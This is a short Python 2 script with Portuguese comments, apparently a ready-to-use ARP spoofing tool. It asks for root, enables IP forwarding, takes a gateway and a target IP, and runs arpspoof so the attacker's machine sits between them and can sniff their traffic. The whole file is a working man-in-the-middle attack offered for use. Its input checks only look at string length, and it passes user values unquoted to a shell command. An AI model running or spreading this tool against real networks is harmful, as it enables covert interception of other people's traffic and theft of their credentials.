#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import time

# exibe nome do script
print("\033[32m" + "______ _   _                       _ _____  " + "\033[0m")
print("\033[32m" + "| ___ \ | | |                     | /  ___| " + "\033[0m")
print("\033[32m" + "| |_/ / |_| | ___  _   _ _ __   __| \ `--.  " + "\033[0m")
print("\033[32m" + "| ___ \  _  |/ _ \| | | | '_ \ / _` |`--. \ " + "\033[0m")
print("\033[32m" + "| |_/ / | | | (_) | |_| | | | | (_| /\__/ / " + "\033[0m")
print("\033[32m" + "\____/\_| |_/\___/ \__,_|_| |_|\__,_\____/  " + "\033[0m")
print(42 * '-')
print("\033[34m" + ' by Jonathan Messias | jmcybers@gmail.com' + "\033[0m")
print(42 * '-')

# verifica se executou com sudo
if os.geteuid() != 0:
    print (42 * '-')
    sys.exit("[-] Execute o script com sudo! ")

# exibe opções de interfaces
print(42 * '-')
print("\033[32m" + "          I N T E R F A C E S" + "\033[0m")
print(42 * '-')
print("1. eth0")
print("2. wlan0")
print(42 * '-')

# validador de entrada
checar_interface = 0

# verifica se foi digitado um inteiro
while not checar_interface:
    try :
        interface = int(raw_input('Escolha a interface [1-2] : ')) ## seleciona a interface
        checar_interface = 1 ## define 1 para validar o input
    except ValueError, e :
        print("\033[31m" + "'%s' não é um número." % e.args[0].split(": ")[1] + "\033[0m")

# verifica opção digitada
if interface == 1:
    interface = 'eth0'
elif interface == 2:
    interface = 'wlan0'
else:
    print(42 * '-')
    sys.exit("\033[31m" + "[-] Opção inválida! " + "\033[0m")

# seta o gateway e o ip do alvo
print(42 * '-')
print(42 * '-')
print("\033[32m" + "       C O N F I G U R A Ç Õ E S " + "\033[0m")
print(42 * '-')

# validador de entrada
checar_gateway = 0

# verifica se gateway tem entre 7 e 15 caracteres
while not checar_gateway:
    gateway = str( raw_input('Gateway : '))
    if len(gateway) < 7 or len(gateway) > 15:
        print("\033[31m" + "Gateway inválido, digite novamente." + "\033[0m")
    else:
        checar_gateway = 1 ## define 1 para validar o input

# validador de entrada
checar_alvo = 0

# verifica se alvo tem entre 7 e 15 caracteres
while not checar_alvo:
    alvo = str( raw_input('Alvo : '))
    if len(alvo) < 7 or len(alvo) > 15:
        print("\033[31m" + "Alvo inválido, digite novamente." + "\033[0m")
    else:
        checar_alvo = 1 ## define 1 para validar o input
        print(42 * '-')

# habilita roteamento de pacotes
ip_forward = os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

if ip_forward == 0:
    for i in range(12):
        sys.stdout.write("\r%s>"%(">"*i))
        sys.stdout.flush()
        time.sleep(0.4)
    print("\033[36m" + ' ROTEAMENTO HABILITADO' + "\033[0m")
    print(42 * '-')
else:
    print(42 * '-')
    sys.exit("[-] Falha para habilitar roteamento! ")

# iniciando sniffing
for i in range(15):
    sys.stdout.write("\r%s>"%(">"*i))
    sys.stdout.flush()
    time.sleep(0.4)
print("\033[36m" + ' INICIANDO SNIFFING' + "\033[0m")
print(42 * '-')
os.system('arpspoof -i %s -t %s -r %s'% (interface, gateway, alvo))